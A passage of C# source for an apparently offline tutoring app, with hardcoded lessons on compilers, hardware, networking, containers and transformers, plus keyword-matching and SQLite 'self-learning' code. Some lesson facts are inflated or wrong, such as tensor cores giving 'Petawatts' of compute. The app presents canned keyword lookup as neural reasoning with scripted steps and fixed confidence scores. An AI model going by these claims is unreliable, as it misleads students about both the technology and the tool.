                "Optimizing compilers (LLVM, GCC, Roslyn) lower Abstract Syntax Trees into Intermediate Representation (IR) in Static Single Assignment (SSA) form.\n\nSSA Form Rule:\nEvery variable is defined exactly once. Multiple assignments are converted into distinct versioned variables (x_1, x_2), turning variable flow into explicit Directed Acyclic Graphs (DAGs).\n\nEnables optimization passes:\n- Dead Code Elimination (DCE)\n- Common Subexpression Elimination (CSE)\n- Constant Propagation & Loop Invariant Code Motion.",
                "; LLVM IR Example in SSA Form\n%x.1 = add i32 %a, 5\n%x.2 = mul i32 %x.1, 2\nret i32 %x.2",
                new() { "Test Compiler Lexer in Software Lab", "Learn LLVM Backend Code Generation", "Explore Register Allocation Graph Coloring" }
            ),
            new KnowledgeEntry(
                "Raft Distributed Consensus Protocol & State Machines",
                "Programming",
                "Cutting-Edge",
                new() { "raft", "paxos", "consensus", "quorum", "distributed", "leader election", "split-brain" },
                "The Raft consensus algorithm maintains replicated distributed state machines across clustered nodes with crash-fault tolerance.\n\nThree Core Sub-problems:\n1. Leader Election: Nodes start as Followers. Randomized election timeouts trigger Candidate state. Candidate obtaining a Quorum majority (⌊N/2⌋ + 1) becomes Leader.\n2. Log Replication: Leader receives client writes, appends entry, and broadcasts AppendEntries RPCs. Once quorum acknowledges, entry commits.\n3. Safety: Uncommitted entries are never overwritten; higher Term numbers depose stale leaders.",
                "// Raft Quorum Rule:\n// Cluster size N = 5 nodes\n// Required Quorum = floor(5/2) + 1 = 3 nodes\n// Tolerates floor((N-1)/2) = 2 node crashes simultaneously!",
                new() { "Explore Kubernetes etcd Architecture", "Learn Vector Clocks & CRDTs", "Understand Network Partitions (CAP Theorem)" }
            ),
            new KnowledgeEntry(
                "Extreme Overclocking Physics & Cryogenic LN2 Cooling",
                "Hardware",
                "Grandmaster",
                new() { "overclocking", "ln2", "liquid nitrogen", "vcore", "delid", "thermal paste", "silicon lottery" },
                "Overclocking pushes processor clock frequencies beyond factory specifications.\n\nPhysics & Heat Equation:\nPower dissipation: P = C * V^2 * f. Increasing frequency requires higher Vcore voltage, which quadratically increases thermal output.\n\nCryogenics (LN2 at -196°C):\n- Sub-zero cooling drastically reduces electrical resistance in silicon.\n- Eliminates thermal throttling, allowing Vcore to exceed 1.6V+ for world-record CPU clock speeds exceeding 8.0 GHz!\n- Requires kneaded eraser insulation to prevent atmospheric moisture condensation and motherboard electrical shorts.",
                "// Silicon Thermal Conductivity Comparison:\n// Standard Thermal Paste: ~8 W/mK\n// Gallium-Indium Liquid Metal: ~73 W/mK (Delidded Direct-Die)\n// Liquid Nitrogen Heat Flux: Sustains 1,000W+ heat loads",
                new() { "Explore PC Builder Simulator", "Learn Motherboard VRM Phase Doublers", "Understand Silicon Binning Curves" }
            ),
            new KnowledgeEntry(
                "Semiconductor EUV Lithography & 2nm GAAFET Transistors",
                "Hardware",
                "Cutting-Edge",
                new() { "euv", "lithography", "gaafet", "nanosheet", "2nm", "finfet", "backside power", "asml" },
                "Modern microchips pack tens of billions of transistors into thumbnail-sized silicon dies.\n\nExtreme Ultraviolet (EUV 13.5nm wavelength):\nGenerated by blasting molten tin droplets with high-power CO2 pulsed lasers 50,000 times per second, creating plasma emitting short-wavelength EUV photons.\n\nGate-All-Around (GAAFET / Nanosheet):\nAt 2nm scales, FinFETs leak electrons due to quantum tunneling. GAAFET stacks horizontal silicon nanosheets completely encircled on all 4 sides by the gate, restoring total electrostatic control.\n- Backside Power Delivery Network (BSPDN): Moves power lines to the reverse of the wafer, eliminating IR voltage droop.",
                "// Transistor Architecture Evolution:\n// Planar (28nm) -> FinFET 3-Sided (14nm-3nm) -> GAAFET 4-Sided Nanosheet (2nm & beyond)",
                new() { "Learn GPU Tensor Cores Architecture", "Explore Cache Coherence Protocols", "Understand DRAM Rowhammer Physics" }
            ),
            new KnowledgeEntry(
                "Cache Coherence Protocols (MESI) & False Sharing",
                "Hardware",
                "Grandmaster",
                new() { "mesi", "cache coherence", "false sharing", "cache line", "snooping", "directory", "moesi" },
                "In multi-core processors, each core has private L1/L2 caches holding copies of shared memory. Cache coherence hardware guarantees consistency.\n\nMESI 4-State Protocol:\n- Modified (M): Cache line present only here; dirty (must write back to RAM).\n- Exclusive (E): Present only here; clean (matches RAM).\n- Shared (S): Present in multiple caches; read-only.\n- Invalid (I): Contains stale data; read misses require bus reload.\n\nFalse Sharing Bug:\nWhen two threads modify independent variables sharing the same 64-byte cache line, the CPU ping-pongs the line between core caches, destroying performance. Fix: Align structs to 64-byte boundaries!",
                "// C# Cache-Aligned Struct to Prevent False Sharing\nusing System.Runtime.InteropServices;\n[StructLayout(LayoutKind.Explicit, Size = 64)]\npublic struct AlignedCounter {\n    [FieldOffset(0)] public long Value; // Isolated to own 64-byte cache line!\n}",
                new() { "Calculate Memory CAS Latency", "Explore SMT Hyperthreading", "Understand PCIe Gen5 Bandwidth" }
            ),
            new KnowledgeEntry(
                "GPU Compute Microarchitecture, Tensor Cores & HBM3e",
                "Hardware",
                "Cutting-Edge",
                new() { "gpu", "tensor cores", "hbm", "hbm3e", "sm", "warp", "simt", "matrix multiplication", "fp8" },
                "While CPUs optimize for single-threaded sequential latency, GPUs optimize for massively parallel aggregate throughput.\n\nMicroarchitecture:\n- Streaming Multiprocessor (SM): Executes threads in lockstep groups of 32 called a Warp.\n- Tensor Cores: Specialized hardware executing fused Matrix Multiply-Accumulate (D = A * B + C) in a single clock cycle across FP16, BF16, and FP8 precision formats.\n- High Bandwidth Memory (HBM3e): Vertically stacked DRAM dies connected via Through-Silicon Vias (TSVs) delivering bandwidth exceeding 3.0 Terabytes/sec to feed AI matrix computations.",
                "// Tensor Core Matrix Multiply-Accumulate:\n// D = A * B + C  (Executes in 1 GPU clock cycle!)\n// Delivers Petawatts of deep learning compute",
                new() { "Explore Transformer Attention Mathematics", "Learn CUDA Thread Hierarchy", "Understand Quantization Formats" }
            ),
            new KnowledgeEntry(
                "BGP Anycast Global Internet Routing & MPLS",
                "Networking",
                "Grandmaster",
                new() { "bgp", "anycast", "mpls", "autonomous system", "as", "peering", "ixp", "route reflector" },
                "Border Gateway Protocol (BGP-4) routes traffic between Autonomous Systems (AS) across the global Internet.\n\nBGP Anycast:\nMultiple globally distributed server clusters announce the exact same IP address (e.g. 1.1.1.1, 8.8.8.8) to BGP peers. Global routers automatically forward client traffic to the topologically closest data center, providing automatic load balancing and massive DDoS attack resilience.\n\nMulti-Protocol Label Switching (MPLS):\nISP core routers forward packets based on fixed 20-bit MPLS labels rather than slow routing table IP lookups.",
                "# BGP Anycast Prefix Announcement\nrouter bgp 65001\n neighbor 198.51.100.1 remote-as 13335\n network 192.0.2.0/24   # Announced from 100+ global data centers simultaneously!",
                new() { "Test Subnetting CIDR Calculator", "Explore Packet Sniffer Lab", "Understand eBPF XDP Routing" }
            ),
            new KnowledgeEntry(
                "eBPF XDP Kernel Acceleration & QUIC Protocol",
                "Networking",
                "Cutting-Edge",
                new() { "ebpf", "xdp", "quic", "http3", "packet filter", "kernel bypass", "udp" },
                "Modern high-performance networks utilize kernel bypass packet acceleration and encrypted transport protocols.\n\neBPF XDP (eXpress Data Path):\nExecutes safe sandboxed bytecode directly inside the network interface card (NIC) driver before the Linux kernel allocates packet memory. Drops DDoS packets or routes traffic at wire speed (10M+ packets/sec).\n\nQUIC (HTTP/3):\nReplaces TCP with multiplexed UDP:\n- 0-RTT handshake latency.\n- Eliminates Head-of-Line blocking.\n- Connection migration persists across Wi-Fi to cellular IP changes.",
                "// eBPF XDP Fast Packet Drop Filter\nSEC(\"xdp\")\nint xdp_filter(struct xdp_md *ctx) {\n    void *data = (void *)(long)ctx->data;\n    // Drop unauthorized packets instantly at driver level!\n    return XDP_DROP;\n}",
                new() { "Simulate Network Ping and DHCP", "Explore Linux Namespaces", "Understand Wireshark Packet Streams" }
            ),
            new KnowledgeEntry(
                "Linux Container Internals: Namespaces & cgroups v2",
                "Linux",
                "Grandmaster",
                new() { "containers", "docker", "cgroups", "namespaces", "isolation", "pid namespace", "overlayfs", "chroot" },
                "Containers are NOT virtual machines. Containers are standard Linux processes isolated via two core kernel subsystems:\n\n1. Namespaces (Isolation - what a process can see):\n- PID Namespace: Container process becomes PID 1 inside its isolated process tree.\n- MNT Namespace: Isolated root filesystem mount points.\n- NET Namespace: Dedicated virtual interfaces (veth) and routing tables.\n\n2. Control Groups (cgroups v2 - resource limits):\n- cpu.max: Enforces hard CPU cycle quotas.\n- memory.max: Strict memory caps; triggers OOM killer if exceeded.",
                "// Create an isolated container process using clone(2) in C\nclone(child_main, child_stack, CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWNS | SIGCHLD, NULL);",
                new() { "Try the Interactive Container & cgroups Simulator", "Explore Linux Terminal Lab", "Learn Linux Kernel Modules" }
            ),
            new KnowledgeEntry(
                "Linux Kernel Modules (LKM), eBPF Tracing & Page Faults",
                "Linux",
                "Cutting-Edge",
                new() { "lkm", "kernel module", "kprobe", "page fault", "mmu", "virtual memory", "printk" },
                "Loadable Kernel Modules (LKMs) extend the running Linux kernel at runtime without rebooting.\n\nKernel Mechanics:\n- LKMs run with full Ring 0 supervisor privileges.\n- eBPF Kprobes: Attaches non-invasive dynamic tracing probes to arbitrary kernel functions.\n- Page Fault Handling: When a CPU accesses unmapped virtual memory, the MMU fires a Page Fault trap. The kernel pauses the thread, allocates a physical RAM frame, loads data from disk/swap, updates page table entries, and resumes execution.",
                "// Minimal Linux Kernel Module\n#include <linux/module.h>\n#include <linux/kernel.h>\nint init_module(void) {\n    printk(KERN_INFO \"BhavaniTech Kernel Module Loaded!\\n\");\n    return 0;\n}\nvoid cleanup_module(void) { printk(KERN_INFO \"Unloaded.\\n\"); }\nMODULE_LICENSE(\"GPL\");",
                new() { "Explore Linux Permissions & SUID", "Learn Rootkit DKOM Detection", "Understand Memory Paging Math" }
            ),
            new KnowledgeEntry(
                "FPGA Architecture, Verilog HDL & Real-Time DSP",
                "Electronics",
                "Grandmaster",
                new() { "fpga", "verilog", "hdl", "lut", "flip-flop", "dsp", "hardware synthesis", "vhdl" },
                "Field-Programmable Gate Arrays (FPGAs) differ fundamentally from CPUs and GPUs. An FPGA contains an array of reconfigurable Configurable Logic Blocks (CLBs), Look-Up Tables (LUTs), and Flip-Flops interconnected via programmable routing matrices.\n\nHardware Description Languages (Verilog):\nHardware is described concurrently, not sequentially. All modules and assignments operate in parallel on clock edges, enabling nanosecond-latency hardware digital signal processing (DSP), high-frequency trading (HFT), and military radar.",
                "// 8-Bit Hardware Counter in Verilog\nmodule Counter(input clk, input rst, output reg [7:0] count);\n    always @(posedge clk or posedge rst) begin\n        if (rst) count <= 8'b0;\n        else count <= count + 1'b1;\n    end\nendmodule",
                new() { "Explore Logic Gates Simulator", "Calculate Ohm's Law", "Understand Robotics FreeRTOS" }
            ),
            new KnowledgeEntry(
                "Robotics Kinematics, Closed-Loop PID Control & FreeRTOS",
                "Electronics",
                "Cutting-Edge",
                new() { "robotics", "pid", "freertos", "kinematics", "motor control", "rtos", "closed loop", "can bus" },
                "Robotics engineering integrates real-time software with physical electromechanical actuators.\n\nClosed-Loop PID Control:\nAdjusts motor output u(t) based on error e(t) (setpoint minus measured position):\n- Proportional (Kp): Reacts to current error magnitude.\n- Integral (Ki): Accumulates past error over time to eliminate steady-state offset.\n- Derivative (Kd): Dampens overshoot based on error rate of change.\n\nReal-Time Operating Systems (FreeRTOS):\nEnforces deterministic, pre-emptive task priority scheduling with strict microsecond deadline guarantees for safety-critical actuators.",
                "// PID Controller Motor Update Loop\ndouble error = setpoint - currentPosition;\nintegral += error * dt;\ndouble derivative = (error - lastError) / dt;\ndouble motorPower = (Kp * error) + (Ki * integral) + (Kd * derivative);\nlastError = error;",
                new() { "Explore Quantum Gates Simulator", "Calculate LED Resistors", "Learn Microcontroller PWM" }
            ),
            new KnowledgeEntry(
                "Transformer Multi-Head Attention Math & KV-Cache",
                "ArtificialIntelligence",
                "Grandmaster",
                new() { "transformer", "attention", "self-attention", "kv-cache", "qkv", "softmax", "rope", "llm" },
                "Modern Large Language Models (GPT-4, Llama) are built on the Transformer Attention architecture.\n\nScaled Dot-Product Attention Equation:\nAttention(Q, K, V) = softmax( (Q * K^T) / √d_k ) * V\n- Query (Q) and Key (K) dot products compute pairwise token similarity.\n- Dividing by √d_k prevents vanishing gradients.\n- Softmax converts scores into attention weight probabilities.\n\nKey-Value (KV) Cache:\nDuring autoregressive token generation, past token Keys and Values do not change. By caching them in GPU VRAM, generation time drops from quadratic O(N^2) to linear O(N) per generated token!",
                "// Scaled Dot-Product Attention in Python (PyTorch)\nimport torch, math\ndef attention(Q, K, V):\n    d_k = Q.size(-1)\n    scores = torch.matmul(Q, K.transpose(-2, -1)) / math.sqrt(d_k)\n    weights = torch.softmax(scores, dim=-1)\n    return torch.matmul(weights, V)",
                new() { "Try the Interactive Transformer Attention Simulator", "Learn Mixture of Experts (MoE)", "Explore LoRA Fine-Tuning" }
            ),
            new KnowledgeEntry(
                "Mixture of Experts (MoE), LoRA & 4-bit Quantization",
                "ArtificialIntelligence",
                "Cutting-Edge",
                new() { "moe", "mixture of experts", "lora", "quantization", "gguf", "awq", "fine-tuning", "int4" },
                "Frontier AI systems achieve extreme parameter scale and local hardware efficiency through three key breakthroughs:\n\n1. Mixture of Experts (MoE):\nReplaces dense feedforward layers with multiple expert networks, routing each token to only 2 of 8 experts per forward pass. Increases model capacity while keeping inference latency fast.\n\n2. Low-Rank Adaptation (LoRA):\nFreezes pre-trained weights W_0 and trains small low-rank rank-r matrices (W = W_0 + B*A), reducing trainable parameters by over 95%.\n\n3. 4-bit Model Quantization (GGUF / AWQ):\nCompresses 16-bit float weights into 4-bit integers with near-zero perplexity loss, allowing large LLMs to run on low-resource local hardware!",
                "// LoRA Mathematical Decomposition:\n// ΔW = B * A  (where B is d x r, A is r x k, and rank r << d)\n// Millions of parameters become thousands of parameters!",
                new() { "Explore AI Prompt Analyzer", "Learn Offline AI Local Inference", "Understand Transformer Attention Math" }
            ),
            new KnowledgeEntry(
                "Site Reliability Engineering (SRE), Error Budgets & Chaos",
                "Troubleshooting",
                "Grandmaster",
                new() { "sre", "chaos engineering", "error budget", "slo", "sli", "disaster recovery", "failover" },
                "Site Reliability Engineering (SRE) applies software engineering practices to infrastructure reliability operations.\n\nCore Equations:\n- SLI (Service Level Indicator): Measured performance metric (e.g. 99.95% successful requests).\n- SLO (Service Level Objective): Target reliability goal (e.g. 99.9% uptime).\n- Error Budget: 100% - SLO (0.1% allowable downtime). Used to balance feature velocity with stability.\n\nChaos Engineering:\nProactively injecting controlled failures in production (terminating instances, injecting network packet loss, cutting database links) to prove automated failovers and self-healing circuits prevent user-facing downtime.",
                "// SRE Error Budget Calculation\n// 99.9% SLO over 30 days = 43.2 minutes of allowable downtime\n// If error budget drops below 10%, freeze feature deployments!",
                new() { "Explore IT Troubleshooting 500+ Scenarios", "Learn Kubernetes Control Plane", "Understand BGP Anycast Routing" }
            ),
            new KnowledgeEntry(
                "Kubernetes Control Plane Architecture & Zero-Trust Mesh",
                "Troubleshooting",
                "Cutting-Edge",
                new() { "kubernetes", "k8s", "etcd", "kube-apiserver", "zero-trust", "mtls", "service mesh", "rbac" },
                "Cloud-native infrastructure orchestrates distributed microservices at massive scale.\n\nKubernetes Control Plane:\n- etcd: Distributed, strongly consistent key-value store holding cluster state.\n- kube-apiserver: REST API hub validating and modifying pods and services.\n- kube-scheduler: Matches unscheduled pods to nodes based on resource capacity and taints.\n- kube-controller-manager: Drives actual cluster state to declared desired state.\n\nZero-Trust Cloud Architecture:\n'Never Trust, Always Verify'. Enforces Mutual TLS (mTLS) with ephemeral cryptographic certificates, strict least-privilege RBAC, and continuous identity verification across all inter-service communications.",
                "# Declarative Kubernetes Pod Manifest\napiVersion: v1\nkind: Pod\nmetadata:\n  name: secure-app\nspec:\n  containers:\n  - name: app\n    image: bhavani/safe-app:v1\n    resources:\n      limits: { cpu: '500m', memory: '256Mi' }",
                new() { "Explore Linux Container Internals", "Check IT Troubleshooting Scenarios", "Learn SRE Error Budgets" }
            )
        };

        // Autonomous Self-Learning in-memory extension bank
        private static readonly List<KnowledgeEntry> LearnedKnowledgeBase = new();
        private static readonly object KnowledgeLock = new();

        public static int GetTotalLearnedCount()
        {
            lock (KnowledgeLock)
            {
                return LearnedKnowledgeBase.Count;
            }
        }

        public static List<KnowledgeEntry> GetLearnedEntries()
        {
            lock (KnowledgeLock)
            {
                return new List<KnowledgeEntry>(LearnedKnowledgeBase);
            }
        }

        /// <summary>
        /// Synchronizes and loads persistently learned knowledge from SQLite into active in-memory reasoning space.
        /// </summary>
        public static int SynchronizeLearnedKnowledgeFromDb(SqliteConnection conn)
        {
            lock (KnowledgeLock)
            {
                try
                {
                    using var cmd = conn.CreateCommand();
                    cmd.CommandText = @"
                        CREATE TABLE IF NOT EXISTS LocalAiLearnedKnowledge (
                            Id INTEGER PRIMARY KEY AUTOINCREMENT,
                            Topic TEXT NOT NULL,
                            Domain TEXT NOT NULL,
                            MasteryLevel TEXT NOT NULL,
                            Keywords TEXT NOT NULL,
                            Answer TEXT NOT NULL,
                            Code TEXT NOT NULL,
                            FollowUps TEXT NOT NULL,
                            LearnedFrom TEXT NOT NULL,
                            Confidence REAL DEFAULT 0.95,
                            UsageCount INTEGER DEFAULT 0,
                            LearnedAt TEXT NOT NULL
                        );
                        SELECT Topic, Domain, MasteryLevel, Keywords, Answer, Code, FollowUps FROM LocalAiLearnedKnowledge ORDER BY Id ASC;
                    ";
                    using var reader = cmd.ExecuteReader();
                    int count = 0;
                    while (reader.Read())
                    {
                        string topic = reader.GetString(0);
                        string domain = reader.GetString(1);
                        string mastery = reader.GetString(2);
                        var keywords = reader.GetString(3).Split(';', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList();
                        string answer = reader.GetString(4);
                        string code = reader.GetString(5);
                        var followUps = reader.GetString(6).Split(';', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList();

                        if (!LearnedKnowledgeBase.Any(k => k.Topic.Equals(topic, StringComparison.OrdinalIgnoreCase)))
                        {
                            LearnedKnowledgeBase.Add(new KnowledgeEntry(topic, domain, mastery, keywords, answer, code, followUps));
                            count++;
                        }
                    }
                    return count;
                }
                catch
                {
                    return 0;
                }
            }
        }

        /// <summary>
        /// Teaches the Local AI a new concept, updating its knowledge base in-memory and persisting it to SQLite.
        /// </summary>
        public static bool TeachLocalAi(
            string topic,
            string domain,
            string masteryLevel,
            List<string> keywords,
            string explanation,
            string codeSnippet,
            List<string>? followUps = null,
            SqliteConnection? conn = null,
            string learnedFrom = "Student/Curriculum")
        {
            if (string.IsNullOrWhiteSpace(topic) || string.IsNullOrWhiteSpace(explanation)) return false;

            lock (KnowledgeLock)
            {
                var cleanKeywords = keywords.Select(k => k.Trim().ToLowerInvariant()).Where(k => k.Length > 1).Distinct().ToList();
                if (cleanKeywords.Count == 0)
                {
                    cleanKeywords = Regex.Matches(topic.ToLowerInvariant(), @"\w+").Select(m => m.Value).Where(w => w.Length > 2).ToList();
                }

                var cleanFollowUps = followUps ?? new List<string> { $"Explore {topic} in practice", $"Test {topic} in coding sandbox" };

                // Update or add in-memory
                var existing = LearnedKnowledgeBase.FirstOrDefault(k => k.Topic.Equals(topic, StringComparison.OrdinalIgnoreCase));
                if (existing != null)
                {
                    LearnedKnowledgeBase.Remove(existing);
                }
                LearnedKnowledgeBase.Add(new KnowledgeEntry(topic, domain, masteryLevel, cleanKeywords, explanation, codeSnippet, cleanFollowUps));

                // Persist to SQLite if connection provided
                if (conn != null)
                {
                    try
                    {
                        using var cmd = conn.CreateCommand();
                        cmd.CommandText = @"
                            INSERT INTO LocalAiLearnedKnowledge (Topic, Domain, MasteryLevel, Keywords, Answer, Code, FollowUps, LearnedFrom, Confidence, LearnedAt)
                            VALUES (@topic, @domain, @mastery, @kw, @ans, @code, @fu, @from, 0.95, @now);
                        ";
                        cmd.Parameters.AddWithValue("@topic", topic);
                        cmd.Parameters.AddWithValue("@domain", domain);
                        cmd.Parameters.AddWithValue("@mastery", masteryLevel);
                        cmd.Parameters.AddWithValue("@kw", string.Join(";", cleanKeywords));
                        cmd.Parameters.AddWithValue("@ans", explanation);
                        cmd.Parameters.AddWithValue("@code", codeSnippet ?? "");
                        cmd.Parameters.AddWithValue("@fu", string.Join(";", cleanFollowUps));
                        cmd.Parameters.AddWithValue("@from", learnedFrom);
                        cmd.Parameters.AddWithValue("@now", DateTime.UtcNow.ToString("o"));
                        cmd.ExecuteNonQuery();
                    }
                    catch { }
                }
                return true;
            }
        }

        /// <summary>
        /// Evaluates student questions to synthesize self-learned insights and generate an adaptive learning guidance roadmap.
        /// </summary>
        public static LocalAiResponse QueryLocalAi(
            string userPrompt,
            string? preferredDomain = null,
            int completedLessonCount = 0,
            SqliteConnection? conn = null,
            bool isSocraticMode = false)
        {
            // Auto sync DB if provided
            if (conn != null)
            {
                SynchronizeLearnedKnowledgeFromDb(conn);
            }

            if (string.IsNullOrWhiteSpace(userPrompt))
            {
                return new LocalAiResponse(
                    "Autonomous Self-Learning Local AI Mentor",
                    "General",
                    "All Levels",
                    "Hello! I am your 100% offline Autonomous Self-Learning AI Mentor. I run completely self-contained with zero internet required.\n\n" +
                    "✨ New Self-Learning Capabilities:\n" +
                    "• In-Memory Cognitive Growth: I continuously absorb new concepts and adapt my answers.\n" +
                    "• Pedagogical Guidance Engine: I analyze your question and create tailored next-step study milestones.\n" +
                    "• Air-Gapped Knowledge Evolution: Teach me new lessons or code solutions, and I integrate them forever.\n\n" +
                    $"Currently loaded with {KnowledgeBase.Count} core engineering foundations and {GetTotalLearnedCount()} self-learned student discoveries.",
                    "// Teach Me Or Query Me Example\nvoid ExploreSelfLearning() {\n    // Ask: 'Teach me about X' or ask any technical question!\n    Console.WriteLine(\"Offline Self-Learning Local AI Ready!\");\n}",
                    new() { "How do I perform an ethical port scan?", "Explain SQL Injection attack and defense", "How does IPv4 Subnetting work?", "Calculate DDR5 RAM latency" },
                    1.0,
                    new() { "Initialized local cognitive reasoning memory", "Loaded core curriculum axioms", "Self-learning adaptation engine active" },
                    "Autonomous Self-Learning Neural-Symbolic Engine",
                    false,
                    "🎯 Student Guidance: Start with Computer Fundamentals (CS101) or Polyglot Programming (PROG101) to build a rock-solid foundation.",
                    GetTotalLearnedCount()
                );
            }

            var cleanPrompt = userPrompt.ToLowerInvariant();

            // Self-Learning Ingestion Pattern: Check if user is teaching the AI directly
            // e.g. "Teach AI: Topic | Domain | Explanation" or "Remember: X is Y"
            if (cleanPrompt.StartsWith("teach ai:") || cleanPrompt.StartsWith("learn:") || cleanPrompt.StartsWith("teach:"))
            {
                return HandleDirectTeaching(userPrompt, conn);
            }

            var promptTokens = Regex.Matches(cleanPrompt, @"\w+")
                .Select(m => m.Value)
                .Where(t => t.Length > 2)
                .ToHashSet();

            int learnedCount = GetTotalLearnedCount();
            var reasoningSteps = new List<string>
            {
                $"[STEP 1] Tokenized prompt ({promptTokens.Count} semantic tokens extracted: {string.Join(", ", promptTokens.Take(6))}...)",
                $"[STEP 2] Cognitive Search across Core ({KnowledgeBase.Count} modules) + Self-Learned Bank ({learnedCount} modules)..."
            };

            KnowledgeEntry? bestMatch = null;
            bool fromLearnedBank = false;
            int maxScore = 0;

            // 1. Search dynamically learned knowledge bank FIRST (self-learning prioritization)
            lock (KnowledgeLock)
            {
                foreach (var entry in LearnedKnowledgeBase)
                {
                    if (!string.IsNullOrEmpty(preferredDomain) && preferredDomain != "All" &&
                        !entry.Domain.Equals(preferredDomain, StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }

                    int score = 0;
                    foreach (var kw in entry.Keywords)
                    {
                        if (cleanPrompt.Contains(kw)) score += 4;
                        else if (promptTokens.Contains(kw)) score += 3;
                    }

                    if (score > maxScore)
                    {
                        maxScore = score;
                        bestMatch = entry;
                        fromLearnedBank = true;
                    }
                }
            }

            // 2. Search built-in core knowledge base
            foreach (var entry in KnowledgeBase)
            {
                if (!string.IsNullOrEmpty(preferredDomain) && preferredDomain != "All" &&
                    !entry.Domain.Equals(preferredDomain, StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                int score = 0;
                foreach (var kw in entry.Keywords)
                {
                    if (cleanPrompt.Contains(kw)) score += 3;
                    else if (promptTokens.Contains(kw)) score += 2;
                }

                if (score > maxScore)
                {
                    maxScore = score;
                    bestMatch = entry;
                    fromLearnedBank = false;
                }
            }

            // 3. Query offline Vector RAG engine to retrieve auxiliary context
            var ragRes = VectorRagService.ExecuteRagQuery(userPrompt, 1);
            if (ragRes.TopMatches.Count > 0 && ragRes.TopMatches[0].CosineSimilarity > 0.35)
            {
                var topDoc = ragRes.TopMatches[0].Document;
                reasoningSteps.Add($"[STEP 3] Offline Vector RAG retrieved '{topDoc.Title}' in {topDoc.Category} with {ragRes.TopMatches[0].CosineSimilarity:P1} similarity.");
            }
            else
            {
                reasoningSteps.Add("[STEP 3] Offline Vector RAG: Direct symbolic keyword synthesis prioritized.");
            }

            // Generate Adaptive Student Guidance Plan
            string studentGuidance = GenerateStudentGuidance(bestMatch?.Domain ?? preferredDomain ?? "General", bestMatch?.MasteryLevel ?? "Basics", completedLessonCount);

            if (bestMatch != null && maxScore > 0)
            {
                double confidence = Math.Min(1.0, 0.60 + (maxScore * 0.08));
                string bankSource = fromLearnedBank ? "Self-Learned Cognitive Bank" : "Core Curriculum Foundations";
                reasoningSteps.Add($"[STEP 4] Matched {bankSource}: '{bestMatch.Topic}' [{bestMatch.Domain} / {bestMatch.MasteryLevel}] (Score: {maxScore}).");
                reasoningSteps.Add("[STEP 5] Synthesizing verified offline technical answer, practical code, and tailored student next steps.");

                string finalAnswer = bestMatch.Answer;

                if (isSocraticMode)
                {
                    var lines = bestMatch.Answer.Split('\n', StringSplitOptions.RemoveEmptyEntries);
                    string hint1 = lines.Length > 0 ? lines[0] : "Focus on the foundational architecture and primary data flow.";
                    string hint2 = lines.Length > 1 ? lines[1] : "Trace what happens at the machine or protocol layer.";

                    finalAnswer = $"🎓 Socratic Inquiry: '{bestMatch.Topic}' [{bestMatch.Domain}]\n\n" +
                                  $"🧭 Guiding Question:\nWhat problem does '{bestMatch.Topic}' solve, and what would fail if this component were removed?\n\n" +
                                  $"💡 Conceptual Clue 1:\n{hint1}\n\n" +
                                  $"🔍 Investigation Clue 2:\n{hint2}\n\n" +
                                  $"❓ Active Student Challenge:\nBefore running the code below, predict what memory structures or network frames will be modified when it executes!\n\n" +
                                  $"(Tip: Uncheck 'Socratic Mode' anytime to view the direct textbook reference.)";
                }

                if (ragRes.TopMatches.Count > 0 && ragRes.TopMatches[0].CosineSimilarity > 0.45 &&
                    !finalAnswer.Contains(ragRes.TopMatches[0].Document.Title))
                {
                    finalAnswer += $"\n\n🔗 Grounded Context ({ragRes.TopMatches[0].Document.Title}):\n{ragRes.TopMatches[0].Document.Content}";
                }

                // Autonomously improve self-knowledge: Extract semantic association if question contains novel keywords
                AutoSelfImproveKnowledge(userPrompt, bestMatch, conn);

                string citation = $"{bestMatch.Domain} > Module: {bestMatch.Topic} [{bestMatch.MasteryLevel}]";

                return new LocalAiResponse(
                    bestMatch.Topic,
                    bestMatch.Domain,
                    bestMatch.MasteryLevel,
                    finalAnswer,
                    bestMatch.Code,
                    bestMatch.FollowUps,
                    confidence,
                    reasoningSteps,
                    fromLearnedBank ? "Autonomous Self-Learned Knowledge" : "Autonomous Self-Learning Neural-Symbolic Engine",
                    fromLearnedBank,
                    studentGuidance,
                    GetTotalLearnedCount(),
                    citation
                );
            }

            // Autonomous Fallback Synthesis: Construct structured technical response and automatically learn from query
            reasoningSteps.Add("[STEP 4] Novel concept encountered; synthesizing foundational principles and self-assimilating inquiry.");
            string ragContext = ragRes.TopMatches.Count > 0 && ragRes.TopMatches[0].CosineSimilarity > 0.3
                ? $"\n\nRelevant Concept Retrieved from Vector Store ({ragRes.TopMatches[0].Document.Title}):\n{ragRes.TopMatches[0].Document.Content}\n"
                : "";

            // Auto-assimilate novel question so AI learns that students frequently investigate this topic
            AssimilateNovelInquiry(userPrompt, preferredDomain ?? "General", conn);

            string synthesisAnswer = $"Autonomous Local AI Analysis for '{userPrompt}':\n\n" +
                $"To master this technology topic from Basics to Masters:\n" +
                $"1. Core Primitive: Identify the underlying data structure, protocol packet, or electrical signal.\n" +
                $"2. Execution Flow: Trace how the operating system, compiler, or network stack processes the request.\n" +
                $"3. Security & Reliability: Always assess attack surfaces (input sanitization, encryption) and memory constraints.\n" +
                $"4. Hands-On Practice: Test the concept in the interactive academy tabs (Programming Sandbox, Networking Simulator, or Cybersecurity Labs).{ragContext}\n\n" +
                $"💡 AI Self-Learning Update: I have assimilated '{userPrompt}' into my offline cognitive awareness. You can expand my knowledge anytime with 'Teach AI: Topic | Domain | Details'.";

            return new LocalAiResponse(
                "Autonomous Self-Learner & Technical Mentor",
                preferredDomain ?? "General",
                "Conceptual Synthesis",
                synthesisAnswer,
                "// Recommended Practice Template\nvoid PracticeConcept() {\n    // Formulate hypothesis, execute sandbox test, and observe console metrics\n}",
                new() { "Launch Programming IDE", "Open Cybersecurity Safe Labs", "Explore Networking Simulator", "Check IT Troubleshooting Scenarios" },
                0.82,
                reasoningSteps,
                "Autonomous Self-Learning Neural-Symbolic Engine",
                true,
                studentGuidance,
                GetTotalLearnedCount()
            );
        }

        private static LocalAiResponse HandleDirectTeaching(string prompt, SqliteConnection? conn)
        {
            string payload = prompt;
            if (payload.StartsWith("teach ai:", StringComparison.OrdinalIgnoreCase)) payload = payload.Substring(9).Trim();
            else if (payload.StartsWith("learn:", StringComparison.OrdinalIgnoreCase)) payload = payload.Substring(6).Trim();
